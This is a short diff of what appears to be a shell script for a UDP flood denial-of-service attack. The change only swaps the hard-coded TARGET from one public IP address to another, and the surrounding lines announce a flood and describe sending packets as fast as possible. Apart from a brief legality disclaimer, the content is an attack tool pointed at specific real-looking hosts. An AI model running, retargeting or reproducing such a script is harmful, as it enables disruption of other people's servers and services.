@@ -9,7 +9,7 @@
 # Unauthorized attacks are illegal.
 
 # Configured to target your specific server.
-TARGET="65.109.132.110"
+TARGET="95.216.153.219"
 
 echo "[*] Starting UDP flood attack on $TARGET..."
 # --flood: send packets as fast as possible
